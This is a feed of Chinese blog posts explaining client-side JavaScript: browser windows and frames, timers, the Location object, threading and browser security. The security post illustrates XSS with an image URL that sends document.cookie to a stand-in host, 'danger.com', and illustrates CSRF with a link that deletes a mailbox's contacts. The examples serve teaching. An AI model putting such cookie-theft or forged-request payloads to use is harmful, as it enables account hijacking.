&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 曾经的IE6一个浏览器窗口就是一个窗口，现在的浏览器都可以在一个浏览器窗口打开多个标签页，其实每个标签页就是曾经的一个窗口。因为它们都是独立的“浏览器上下文”，每一个上下文都有一个独立的window对象，它们之间相互独立，互不干扰。每个标签页中运行的脚本通常不知到其他标签页的存在，更不用说其他标签页的window对象进行相互交互或者操作其文档内容了。&lt;/p&gt;

&lt;p&gt;但是窗口之间并不总是没有关系的，一个窗口或标签页中的脚本可以打开一个新的窗口，这时候关联起来的多个窗口之间就可以相互操作了。&lt;/p&gt;

&lt;p&gt;html文档通常使用iframe进行文档嵌套，iframe也相当一个窗口，一般叫它“窗体”。窗体所创建的上下文是用它自己的window对象表示。但iframe和其外层的window对象并不是相互独立的。在一个窗体中运行的js程序总能看到它的祖先和子孙窗体，尽管脚本查看这些窗体中的文档同样受到同源策略的限制。&lt;/p&gt;

&lt;p&gt;对客户端js来说，窗口、标签页、窗体（iframe）、框架（frameset、frame）等都是浏览上下文，对于js来说它们都是独立的window对象，尽管有一些可以引用到其他的window对象。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs&quot;&gt;White:js如何打开和关闭窗口？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; window对象的open()方法可以打开一个新的浏览器窗口，window.open(url,name,options)载入指定的url到新的或已经存在的窗口中（根据name判断），并返回代表新打开的窗口的window对象。&lt;/p&gt;

&lt;p&gt;open方法能够指定到第二个参数name指定的窗口要受“允许导航”的限制，宽泛地讲，当且仅当窗口包含的文档来自相同的源（同源测策略）或者是这个脚本打开了哪个窗口，脚本才可以只通过名字来指定存在的窗口。否则会通过猜测名字来操作其他任意窗口了，这在安全上是不允许的，比如恶意脚本发现你在浏览网上银行，它在那个页面重新载入一个钓鱼网站，这就是不允许的。&lt;em&gt;脚本无法通过简单的猜测窗口的名字来操控这个窗口的web应用。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;还有如果一个窗体嵌套在一个窗口中，它们的脚本是可以可以相互导航的，这种情况可以使用保留字“_top”、“_parent”来获取彼此的浏览上下文。通过&lt;code&gt;var w = window.open(&amp;quot;http://cn.bing.com&amp;quot;);&lt;/code&gt;时w是新窗口的window对象。在新窗口中window.opener是当前的窗口的window对象。它们也建立了相互的导航关系，可以进行互操作，比如&lt;code&gt;w.alert(&amp;#39;abc&amp;#39;);w.location=&amp;quot;http://www.googel.com&amp;quot;;&lt;/code&gt;都会在新窗口引起相应操作。&lt;code&gt;w.close();&lt;/code&gt;也会关闭那个新窗口。&lt;em&gt;但是操作其他窗口的文档的时候还是要受到“同源策略”的限制的，这是安全的要求。&lt;/em&gt; &lt;code&gt;w.document；&lt;/code&gt;如果不是同源，就会报错，因为它有安全风险。&lt;/p&gt;

&lt;p&gt;要关闭当前窗口只要调用window.close()方法。大多数浏览器只允许自动关闭由自己js代码创建的窗口。如果要关闭其他窗口，需要用户确认关闭或取消。在窗体而不是顶级窗口的window.close()不会有任何效果，它不能关闭一个窗体（反之可以从文档中删除iframe）。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_2&quot;&gt;White:窗体之间的关系是什么样的？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;任何窗口或窗体中的js代码都可以将自己的窗口或窗体引用为window或self。&lt;/li&gt;

&lt;li&gt;窗体可以用parent引用包含它的窗口的window对象。&lt;/li&gt;

&lt;li&gt;由window.open()创建的窗口中的js可以通过window.opener来引用打开它的窗口的window对象。&lt;/li&gt;

&lt;li&gt;iframe元素有contentWindow属性引用该窗体的window对象。&lt;/li&gt;

&lt;li&gt;在窗体中可以通过window.frameElement来取得其iframe。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_js&quot;&gt;White: js如何进行跨窗口的交互？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;首先窗口之间是“可导航的”。&lt;/li&gt;

&lt;li&gt;导航到相应窗口再执行js代码。&lt;/li&gt;

&lt;li&gt;受到同源策略限制。&lt;/li&gt;

&lt;li&gt;牢记词法作用域，函数在定义它的作用域中执行，而不是在它的调用的作用域执行。&lt;/li&gt;

&lt;li&gt;构造函数也是函数，用构造函数和相关原型对象定义一个类时，那个类只在一个单独的窗口中定义。&lt;/li&gt;

&lt;li&gt;内置类（String、Number、Date等）会在所有窗口中预定义，每个都是一个独立的副本。&lt;/li&gt;

&lt;li&gt;实际上每个window对象也是一个独立的副本。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW客户端js之异步调度(五)</title>
   <link href="http://izhanghuaning.github.io/2011/07/25/jsdg-chap14-timer.html"/>
   <updated>2011-07-25T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/07/25/jsdg-chap14-timer</id>
   <content type="html">&lt;p&gt;&lt;strong&gt;&lt;em&gt;本篇是翻译，向大师致敬，原文请参见&lt;a href=&quot;http://ejohn.org/blog/how-javascript-timers-work/&quot;&gt;How JavaScript Timers Work&lt;/a&gt;。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在最基本的层面，理解js计时器如何工作是很重要的，因为js的单线程模型经常导致事件的发生时间语预期不符。让我们从三个涉及到时间调度的函数入手看js如何进行事件执行时间的调度。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	* var id = setTimeout(fn, delay); //初始化一个延迟计时器，它在dealy毫秒事件后执行fn函数。这个初始化函数返回一个计时器句柄，可以用来在delay未到的事件内，取消其指定的fn函数的执行。

	* var id = setInterval(fn, delay); //初始化一个区间执行计时器，它每间隔delay就执行一次fn函数，直到通过其初始化函数返回的句柄取消后续执行。

	* clearInterval(id);, clearTimeout(id); //以上述的计时器句柄为参数，停止计时器继续执行回调函数。&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;为了深入理解计时器的执行首先要记住一个概念：计时器延时执行不是精确的，是不能保证的。浏览器执行异步事件(比如鼠标点击响应事件、计时器回调事件、XMLHttpRequest回调事件等)都是通过单线程执行的，一次只能执行一个事件。这些事件是通过一个事件队列进行管理的，概念上如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/themes/twitter/img/Timers.png&quot; alt=&quot;&quot; title=&quot;js事件调度&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上图包含很多内容，完全理解这些内容对你深入认识js事件异步执行方式很有帮助。这个图只有从上倒下的执行时间一个维度，时间是以毫秒为单位。每个蓝色盒子代表一个函数的执行，其盒子的大小代表执行事件的长短，第一个盒子可以是在全局环境解释执行入口代码的过程，大约是18ms。第二个盒子是相应用户点击的事件，大约是11毫秒，依次类推。&lt;/p&gt;

&lt;p&gt;因为单线程，js每次只能执行一个函数（蓝色快），此时线程被锁住，此时发生的异步事件（鼠标点击、计时器回调、XMLHttpRequest完成等）需要等正在执行事件执行后才能代进入执行队列（具体队列怎么管理各个浏览器都有自己的方式，不妨考虑简单点）。&lt;/p&gt;

&lt;p&gt;如图所示：在开始的第一个蓝色块（块1）中，初始化了2个计时器，一个延时10ms的延时计时器，一个间隔10ms的区间计时器。延时计时器在块1执行完之前就触发了，但是因为线程被块1锁住，所以它不能立即触发回调事件，计时器触发的事件实际上最早也是在第一个代码块（函数）执行完之后才能执行，所以这个延时计时器回调函数就进入了待执行队列等待下一个执行时间（等待线程解锁）。&lt;/p&gt;

&lt;p&gt;另外在块1中，还有一个鼠标点击响应事件发生。js的响应事件是异步事件（我们不可能知道用户的行为），正如延时计时器的回调函数，它也不能立即执行，也进入了待执行队列等待。&lt;/p&gt;

&lt;p&gt;在块1执行完成后，浏览器问了一个问题：还有谁在等待执行？延时计时器回调函数和鼠标响应事件在等待中。浏览器选择了鼠标响应事件执行，延时计时器触发事件则继续留在队列中等待（注意块1中鼠标响应触发没有延时，所以其早于延时计时器的触发）。&lt;/p&gt;

&lt;p&gt;注意：在块2的鼠标响应事件执行过程中，区间计时器触发了回调，它也是异步事件，所以它也进入待执行队列等待执行。注意在块3的延时计时器执行回调的过程中，区间计时器又触发了回调，又要把它放入待执行队列中等待，&lt;strong&gt;但是发现队列中已经存在了一个待执行的回调还没有执行，所以这个触发被放弃了&lt;/strong&gt;。因为如果前面一个函数执行了很长时间的大代码，区间计时器不停向队列添加事件的话，队列里就会连续的无间隔的执行同一个回调函数，知道完成。而浏览器则简单的判断：如果队列中没有同一个区间计时器的触发事件才添加新的，所以块3的回调会被放弃。&lt;/p&gt;

&lt;p&gt;在块4中我们看到，区间计时器的回调执行过程中又触发了新的回调。&lt;strong&gt;这告诉我们一个重要的事实：区间计时器不关心什么正在执行，它们只是机械的每到间隔时间(10ms)就触发一个回调，这样真正执行的间隔就不关心了，会产生事件差，所以区间计时器的时间间隔如果足够小就会无间隔的连续执行。它的间隔事件不是回调事件之间的间隔，而是触发时间的间隔，这个很重要。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在块5中第二个区间计时器回调函数执行完，待执行队列没有任何事件在等待，所以浏览器就停下来等待新的异步事件的发生。这段时间线浏览器不工作。当下一个区间计时器回调被触发，它就立即执行，因为前面没有任何函数正在执行。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;（这段是我Black自己加上去帮助大家理解的）如上图所示：在开始第一个蓝色快中，依次发生了初始化一个延迟10ms的setTimeout延时计时器、一个鼠标响应事件回调，初始化一个间隔10ms的setInterval的区间计时器、触发延时计时器这些事件。这些事件分别有一个函数表示它，这些函数有的是同步执行的（2个计时器的初始化函数），也有异步执行的（鼠标点击响应事件、延时计时器触发事件），同步执行的函数在第一个蓝色块中执行完成，异步执行的则依次加入待执行事件的队列。所以第一个蓝色块执行完成时的队列依次是：鼠标点击响应事件、延时计时器触发事件。这时候区间计时器还没有触发其响应函数。这里主要提醒就是同步和异步的区别，只有异步调用会进入待执行队列等待，同步的在其调用块中直接执行完成。&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;下面延时了延时计时器模拟的循环执行和区间计时器的循环执行的不同。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	setTimeout(function(){
	    /* Some long block of code... */
	    setTimeout(arguments.callee, 10);
	  }, 10);
	 
	  setInterval(function(){
	    /* Some long block of code... */
	  }, 10);&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;粗看这两个函数似乎的效果是一样的，实际上不是这样。正如上面对区间计时器的时间间隔的解释：它是触发时间的间隔，而不是执行事件之间的调用间隔。而延时计时器是调用时间的间隔，只可能大于10ms(考虑不能立即执行的情况)，不可能小于10ms。&lt;/p&gt;

&lt;p&gt;我们总结一下这次所学习的内容：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;js引擎是单线程，它强迫异步事件进行排队处理。&lt;/li&gt;

&lt;li&gt;setTimeout和setInterval在执行异步回调是本质上的不同。&lt;/li&gt;

&lt;li&gt;因为队列处理，如果前面的没执行完成，后面的就不能执行，所以延迟或间隔不是一个可保证的事实。&lt;/li&gt;

&lt;li&gt;区间计时器可能会无间隔连续执行（如果触发间隔小于执行时间的话）。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;所有这一切是是帮助理解js异步调用中令人觉得违反直觉的重要知识。了解JavaScript引擎的工作原理，特别是与大量异步事件的调度方式，为大规模开发js代码打下一个很好的基础。&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>BW客户端js之window对象(四)</title>
   <link href="http://izhanghuaning.github.io/2011/07/20/jsdg-chap14-window.html"/>
   <updated>2011-07-20T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/07/20/jsdg-chap14-window</id>
   <content type="html">&lt;h4 id=&quot;whitewindowsettimeoutsetinterval&quot;&gt;White:window对象的setTimeout()和setInterval()方法的使用？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; setTimeout(callback,ms)方法是用来延迟调用的，就是用来注册在ms毫秒后单次调用callback函数。setInterval(callback,ms)方法是用来注册在每过ms毫秒后重复调用callback函数。&lt;/p&gt;

&lt;p&gt;正如表达式篇章提到过&lt;a href=&quot;/2011/05/25/jsdg-chap4-expression-operators2.html&quot;&gt;setTimeout也是一种eval&lt;/a&gt;。setTimeout和setInterval的第一个参数可以作为字符串输入，如果这么做，那这个字符串会在指定的超时时间或间隔之后进行求值（相当于eval）。&lt;/p&gt;

&lt;p&gt;关于它们的触发触发时间的规律，请参见&lt;a href=&quot;/2011/07/25/jsdg-chap14-timer.html&quot;&gt;javascript响应事件如何在单线程模型中工作&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;如果以0ms的超时时间来调用setTimeout()，那么指定的函数不会立即执行。相反把它放到待执行队列中，等前面处于等待处理的事件处理程序全部执行完成后，再”立即”调用它。像鼠标点击等异步事件的响应程序都是这样字的。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitelocation&quot;&gt;White:浏览器如何通过Location对象定位和导航？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; window对象的location属性引用的是Location对象，它表示该窗口中当前显示的文档的url，并定义了方法来使窗口载入新文档。&lt;/p&gt;

&lt;p&gt;Document对象也有一个URL属性，是文档首次载入后保存该文档url的静态字符串。如果定位到文档中的片段标识符(如#table-of-contents)，Location对象会做相应更新，而document.URL属性却不会改变。&lt;/p&gt;

&lt;p&gt;Location对象包括protocol、host、hostname、port、pathname、search、hash、href等属性，其中href是包含url完整文本的字符串，其他属性分别表示url的各个部分。它们成为“url分解”属性，同时被Link对象（html中a元素）支持。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejsquerystring&quot;&gt;White:如何使用js提取查询字符串（querystring）参数？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; Location对象的hash和search属性比较有趣。如果存在的话，hash返回url中“片段标志符”部分（只在浏览器使用，不会上传到服务器），search返回的是查询字符串（url中问号之后的键值对）。&lt;/p&gt;

&lt;p&gt;查询字符串一般来说是用来参数化url并在其中嵌入参数的，一般是用于服务器端的脚本，但在js页面也可以使用它们，如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;	/*这个函数用来解析来自url的查询字符串name=value参数对，
	 *它将name=value对储存在一个对象的属性中，并返回该对象
	 *用法如下：
	 *var args = urlArgs();
	 *var q = args.q || &amp;quot;&amp;quot;;
	 *var n = args.n || 10;
	 */

	 function urlArgs() {
		var args = {};
		var query = location.search.substring(1);
		var pairs = query.split(&amp;#39;&amp;amp;&amp;#39;);
		for(var i = 0; i &amp;lt; pairs.length; i++) {
			var pos = pairs[i].indexof(&amp;#39;=&amp;#39;);
			var name = pairs[i].substring(0, post);
			var value = pairs[i].substring(post+1);
			value = decodeURIComponent(value);
			args[name] = value;
		}
		return args;
	 }&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs&quot;&gt;White:在浏览器中使用js载入新文档的方式有哪些？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;assign(url)方法使窗口载入并显示你只定的url中的文档。&lt;/li&gt;

&lt;li&gt;replace(url)方法同assign()类似，但是会在载入前从浏览历史中把当前文档删除，不能使用后退退回旧文档。&lt;/li&gt;

&lt;li&gt;reload()方法重新载入当前文档。&lt;/li&gt;

&lt;li&gt;给location属性赋值&lt;code&gt;location=&amp;quot;newpage.html&amp;quot;&lt;/code&gt;。&lt;/li&gt;

&lt;li&gt;纯粹的hash不会让浏览器载入新文档，而会滚动到hash所指定的锚点&lt;code&gt;location=&amp;quot;#top&amp;quot;&lt;/code&gt;。&lt;/li&gt;

&lt;li&gt;改变Location的url分解属性会导致浏览器载入新文档&lt;code&gt;location.search=&amp;quot;?page=&amp;quot;+(pagenum + 1)&lt;/code&gt;。&lt;/li&gt;

&lt;li&gt;location.href同location一样导致加载新指定的文档。&lt;/li&gt;

&lt;li&gt;window.open是在新窗口打开指定的文档，强调的是新窗口，所有的window对象都是新的了。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitewindow&quot;&gt;White:window提供哪些对话框？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;alert(str)向用户提示一条信息，并等待用户关闭对话框。&lt;/li&gt;

&lt;li&gt;confirm(str)向用户显示一条信息，并要求用户单击“确定”或“取消”按钮，并返回一个布尔值代表你的选择。&lt;/li&gt;

&lt;li&gt;prompt(str)显示一条信息，并等待用户输入其回答的字符串，并返回用户输入的字符串。&lt;/li&gt;

&lt;li&gt;showModalDialog()在当前窗口显示一个模态窗口，第一个参数是指定html内容的url，第二个是任意值（对象）通过window.dialogArguments访问，第三个参数类似window.open进行窗口定制化。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;注意：前三个字符串都是纯文本，而不是html格式的文本，所以换行要用&lt;code&gt;\n&lt;/code&gt;而不是&lt;code&gt;&amp;lt;br /&amp;gt;&lt;/code&gt;等。还有这些对话框都是阻断式的，会锁定整个窗口。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW客户端js之安全概述篇(三)</title>
   <link href="http://izhanghuaning.github.io/2011/07/15/jsdg-chap13-security.html"/>
   <updated>2011-07-15T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/07/15/jsdg-chap13-security</id>
   <content type="html">&lt;h4 id=&quot;whitejs&quot;&gt;White:为什么要重视客户端js的安全性？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; web浏览器包含js解释器，也就是说一旦载入web页面，就可以让页面上的任意js代码在计算机中执行。&lt;/p&gt;

&lt;p&gt;页面中的js代码来自网络，其中有可能包含恶意代码，盗取用户信息、隐私或者破坏用户系统，所以很明显这里存在安全隐患。浏览器厂商强调自己产品的安全性保障，它们在下面两方面博弈：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;定义强大的客户端API，启用强大的web应用。&lt;/li&gt;

&lt;li&gt;阻止恶意代码读取或修改数据、盗取隐私、诈骗或浪费时间。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;浏览器厂商一方面禁止客户端js的一些功能，比如js不能随意读取、写入或删除任意本地文件或目录；客户端js没有任何网络通讯能力；客户端js不能构建服务器，即网络中的浏览器之间无法直接进行通信。&lt;/p&gt;

&lt;p&gt;另一方面浏览器厂商对于支持的一些功能施加限制，来加强安全性。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_2&quot;&gt;White:客户端js有哪些限制？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;js程序可以打开一个新窗口，但浏览器限制它只能影响用户单击鼠标等操作触发事件的时候才能使用它。&lt;/li&gt;

&lt;li&gt;js可以关闭自己打开的窗口，但不允许它不经用户确认就关闭其他的窗口。&lt;/li&gt;

&lt;li&gt;html的fileupload控件的value属性是只读的，意味着它只能是用户主动选择的文件。&lt;/li&gt;

&lt;li&gt;js不能读取从不同服务器载入的文档的内容，遵循同源策略。js文件的内容可以跨域访问，利用它构建jsonp技术。&lt;/li&gt;

&lt;li&gt;js脚本不能在来自不同服务器的文档上注册事件监听器。防止脚本窃取其他页面用户输入。&lt;/li&gt;

&lt;li&gt;XMLHttpRequest只能访问同源的服务器。&lt;/li&gt;

&lt;li&gt;js可以打开其他服务器的页面，但不能读取页面上的js脚本和html内容。&lt;/li&gt;

&lt;li&gt;cookie的访问遵循同源策略。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;后面几条都是基于同源策略作出的安全限制。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white&quot;&gt;White:什么是同源策略？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 同源的意思是url中的协议(http,https)、域名、端口必须相同，并且域名不能是com、net这样的顶级域名。如果包含子域名，则子域名也必须相同。&lt;/p&gt;

&lt;p&gt;同源策略是对js代码能够操作哪些web内容的一条完整的安全限制。当web页面使用iframe元素或者打开其他窗口的时候，这一策略通常会发挥作用。此时同源策略负责管理窗口或窗体中js代码和其他窗口间的交互。具体来说，脚本只能读取和所述文档来源相同的窗口和文档的属性。&lt;/p&gt;

&lt;p&gt;脚本本身的来源和同源策略不相关，相关的是脚本所在的文档。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;white_2&quot;&gt;White:安全的突破同源策略的技术？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 因为同源策略的限制太严格，给现实需求带来一些问题。比如一个大站点包含多个子域，有些信息需要在多个子域间共享。为了支持这种需求，有了如下几种不严格的同源策略解决方式：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;可以设置不同子域文档的document的domain属性到其上一级域名。设置的域名只能提升到上级域名，而不能降低或者跳到同级其他域名。&lt;/li&gt;

&lt;li&gt;动态script实现，即jsonp技术,可以完全跨域名但是接受请求的一般会严格限制其来源来保证安全性。&lt;/li&gt;

&lt;li&gt;利用ifrmae和hash实现，hash可以跨窗口，可以完全跨域名。&lt;/li&gt;

&lt;li&gt;利用window.name实现，window.name可以跨窗口，可以完全跨域名。&lt;/li&gt;

&lt;li&gt;HTML5提出了跨文档消息(cross-document messaging)，允许来自一个文档的脚本可以传递文本消息到另一个文档的脚本，不考虑其来源。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitexss&quot;&gt;White:什么是跨站脚本攻击(XSS)？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 跨站脚本(Cross-site script)是攻击者像目标web页面注入html标签和脚本，使得访问这个页面的浏览者受到攻击。&lt;/p&gt;

&lt;p&gt;举例说明：页面xss.html中的一部分内容是动态读取其他用户录入的信息，但是某个恶意用户在其中输入了&lt;code&gt;alert(&amp;#39;你被攻击了&amp;#39;)&lt;/code&gt;，然后”页面没有进行安全处理把恶意输入记录了”，当其他浏览者访问xss.html页面时，”页面也没有进行安全处理就显示了这些内容”，那么用户就被攻击了。&lt;/p&gt;

&lt;p&gt;其实上述两个安全处理都很复杂，涉及到编码等情况让其复杂无比。方案有编码输入输出、设置白名单(黑名单不推荐)、设置安全边界等等。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitexss_2&quot;&gt;White:电子邮件来说明跨站脚本攻击(XSS)？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 我们知道一般电子邮箱都会默认屏蔽图片的显示，我就来说一下为什么要这么做。电子邮箱的内容是支持html的，那么其内容也就可能是带有js代码和html元素。比如一张图片其&lt;code&gt;src = &amp;#39; h t t p://danger.com/getcookie/xss.jpg?msg = document.cookie&amp;#39;&lt;/code&gt;。这里我随便写的只是为了举例说明原理，没有测试过。&lt;/p&gt;

&lt;p&gt;当你显示这张图片的时候，浏览器会访问src指向的地址来获取图片，这时候你肯定是登录了邮箱，所以后面的’document.cookie’会把你电子邮箱的身份信息发送到danger.com，它通过一段代码把你的信息记录下来，这些信息可能包含你的银行卡号、电话号码、密码等等（这要看你使用的电子邮件服务商的安全性）。这样恶意用户就得到了你的很多信息了，可以用来做很多危害你的事情。比如CSRF。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitecsrf&quot;&gt;White:什么是跨站请求伪造攻击(CSRF)？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 跨站请求伪造（Cross-site request forgery）是攻击者盗用了你的身份，以你的名义发送恶意请求，执行了你不知道的操作。&lt;/p&gt;

&lt;p&gt;上面恶意用户知道了你的很多信息，又给你一封恶意邮件，上面包含一个删除你通讯录所有电邮地址的链接，这个链接被伪装为”点击我得500W”、”点击看美女”等非常诱惑的信息，其实它的链接是这样&lt;code&gt;href=&amp;#39;h t t p://yourmail.com/api/operate=deleteallcontacter&amp;#39;&lt;/code&gt;这样的，你点击之后你的联系人统统不见了。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitedos&quot;&gt;White:什么是拒绝服务攻击(DOS)？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; 这个以前经常见，你打开一个网页，不停弹出提示让你确定，却永远确定不完，也不能关闭窗口，就属于这样的攻击。就是让你不能使用。不过现在这样的几乎不见了，浏览器帮你处理掉这样的恶意代码了。&lt;/p&gt;

&lt;p&gt;但是有些比较隐晦使用window.setInterval()这样的方法来占用你的cpu，也能达到拒绝服务攻击的效果。&lt;/p&gt;

&lt;p&gt;DOS通常来指的是攻击服务器，只要攻击来源足够多，没有一劳永逸的办法防御，只能通过延长请求间隔、封锁ip、防机器人验证等方式来减缓攻击造成的危害。&lt;/p&gt;
&lt;hr /&gt;</content>
 </entry>
 
 <entry>
   <title>BW客户端js之线程篇(二)</title>
   <link href="http://izhanghuaning.github.io/2011/07/10/jsdg-chap13-jsthread.html"/>
   <updated>2011-07-10T00:00:00+08:00</updated>
   <id>http://izhanghuaning.github.io/2011/07/10/jsdg-chap13-jsthread</id>
   <content type="html">&lt;h4 id=&quot;whitejs&quot;&gt;White:浏览器中的js线程模型？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; js语言核心并不包含任何线程机制，并且客户端js在HTML5之前也没有定义任何线程机制。HTML5定义了一种后台线程的”Web Worker”，但客户端js还是严格按照单线程工作。&lt;/p&gt;

&lt;p&gt;单线程执行意味着浏览器必须在脚本和事件处理程序执行的时候停止相应用户输入，所以不能够编写需要长时间运算的脚本，如果需要这样的脚本需要分解为离散的子任务，可以使用setTimeout()、setInterval()方法在后台运行子任务，同时更新一个进度条向用户反馈。&lt;/p&gt;

&lt;p&gt;HTML5定义的”Web Worker”是一个在后台执行密集计算任务而不冻结用户界面的后台进程。它不能访问dom内容，不能和主线程或其他worker共享状态，只可以和主线程或其他worker通过异步事件进行通信，所以主线程不能检测并发性，并且worker不能修改js程序的基础单线程执行模型。&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitejs_2&quot;&gt;White:客户端js时间线上的事件是如何分布的？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;web浏览器创建document对象，并开始解析web页面，解析html元素和它们的文本内容后添加Element对象和Text节点到文档中。在这个阶段document.readstate的属性值是”loading”。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;当html解析器遇到没有async和defer属性的script标签时，它把这些元素添加到文档中，然后执行内联js脚本或者外联js文件代码。这些脚本会同步执行，并在脚本下载和执行时解析器会暂停。这样脚本就可以使用document.write()把文本插入到输出流中。解析器恢复时这些文本会成为文档的一部分。同步脚本经常简单的定义函数和注册后面使用的事件处理程序，但它们可以遍历和操作文档树，因为在它们执行时已经存在了。同步脚本还能够且只能够看到它执行前渲染好的文档内容，包括自己script元素本身。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;当解析器遇到有async属性的script标签时，它们开始下载脚本，并且同时进行后面的文档解析。脚本会在它下载完成后尽快执行，但解析器不会停下来等它下载。异步脚本禁止使用document.write()方法。它也只能看到其script标签之前的内容。（因为是异步，其不能依赖其他异步生成的文档内容）&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;当文档解析完成，document.readstate属性变成”interactive”。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;所有有defer属性的脚本，会按照它们在文档里出现顺序执行。defer延迟脚本其能访问整个文档树。延迟脚本禁止使用document.write()方法，因为浏览器解析已经完成了。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;浏览器在document对象上触发DOMContentLoaded事件。这标志程序执行从同步脚本执行阶段转换到异步事件驱动阶段。但要注意，这时可能还有异步脚本没有执行完成。css文件、图片、js脚本等也可能还在下载。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;当图片等所有内容完成载入，并且所有的异步脚本完成载入和执行，document.readstate属性变为”complete”，web浏览器触发window对象的load事件。&lt;/p&gt;
&lt;/li&gt;

&lt;li&gt;
&lt;p&gt;从此刻起，回调用异步事件，以响应用户输入事件、网络事件、计时器过期等。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;whitehtmljs&quot;&gt;White:html中js时间线在首屏加载的意义？&lt;/h4&gt;

&lt;p&gt;&lt;em&gt;Black:&lt;/em&gt; js时间线没有指定什么时候文档开始对用户可见或什么时候web浏览器必须开始相应用户输入事件。在对于很长的文档或者非常慢的网络连接的时候，需要控制加载内容使用户能够尽快看到内容和操作文档，这就是首屏加载。&lt;/p&gt;

&lt;p&gt;一般来说首屏用到的文档内容（html）、交互（js）、视觉效果（css）需要尽快加载完成。其他内容可以通过动态加载方式继续加载和渲染。&lt;/p&gt;

